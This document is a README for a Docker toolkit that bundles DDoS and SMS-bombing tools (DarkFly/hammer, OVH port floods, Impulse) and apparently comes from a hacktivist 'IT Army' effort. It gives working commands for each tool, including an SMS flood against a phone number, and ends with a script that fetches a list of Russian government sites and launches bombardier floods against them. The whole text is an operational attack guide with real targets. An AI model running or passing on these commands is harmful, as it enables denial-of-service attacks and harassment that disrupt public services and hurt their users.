# Intro

toolbox container includes:

* https://github.com/Ranginang67/DarkFly-Tool
* https://github.com/HardyTomas/DDos-Attack-OVH-.git
* https://github.com/LimerBoy/Impulse.git

# Use


[more detailed documentation](containers/README.md)

(Optional) Build container:

```shell
docker build -t droopy4096/uait-tools -f containers/Dockerfile.toolkit .
```

Login into container shell:

```shell
docker run --rm -it droopy4096/uait-tools
root@bda7c51682fb:/opt# 
```

from here several tools are at your disposal:

## DarkFly

https://telegra.ph/DDOS-sajta--DarkFly-08-11

just launch DarkFly console:

```shell
DarkFly
```

follow `1` then `16` to install `hammer` into `/root/hammer.py` 

## DDos-Attack-OVH-

https://github.com/HardyTomas/DDos-Attack-OVH-

```shell
cd DDos-Attack-OVH-
python3 80port.py
# or
python3 443port.py
```

##  LimerBoy / Impulse 

https://github.com/LimerBoy/Impulse

```shell
cd LimerBoy-Impulse
python3 impulse.py --method SMS --time 20 --threads 15 --target +380123456789
```

# Automated bombardier

to spawn several `bombardier`'s in isolated docker containers:

```shell
tools/bombarder.sh $(curl -s https://raw.githubusercontent.com/UA-IT-Army/aggressor-sites/main/ru/ru_gosuslugi.json | jq -r '. | keys[]')
```